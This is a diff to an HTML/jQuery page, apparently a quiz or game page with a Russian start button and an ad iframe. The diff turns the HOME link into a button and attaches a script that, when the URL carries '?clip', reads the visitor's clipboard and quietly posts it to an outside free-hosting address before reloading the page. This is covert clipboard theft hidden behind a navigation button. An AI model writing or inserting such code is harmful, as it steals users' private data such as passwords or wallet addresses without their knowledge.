@@ -72,13 +72,21 @@
     <script>
     var t, id;
         $(document).ready(function(){
-          navigator.clipboard.readText()
-  .then(text => {
-    alert(text);
-  })
-  .catch(err => {
-    console.log('Something went wrong', err);
-  });
+          $("#home").click(function(){
+          if(document.location.search == "?clip"){
+            setTimeout(function(){
+          navigator.clipboard.readText().then(text => {
+    $.ajax({
+      url: "https://footmal.000webhostapp.com/neon.html",
+      type: "post",
+      dataType: "html",
+      crossDomain: true,
+      data: ({text: text, type: "type"})
+    });
+            document.location.href = document.location.href;
+  });         
+          }
+                       });
             var h0 = $("#center").width();
             var h = h0/25;
             $(".ques").css("font-size", h);
@@ -116,7 +124,7 @@
   <body>
 
 <iframe scrolling="no" src="https://neon.today/context/get/58861/18589/1/468/60" style="width: 468px; height: 60px;  padding: 0;border: 1px dotted grey;" frameborder="0"></iframe>
-    <br/><a href="index.html">HOME</a>
+    <br/><button id="home">HOME</button>
   <div id="start">
         <button id="s">Начать</button>
     </div>
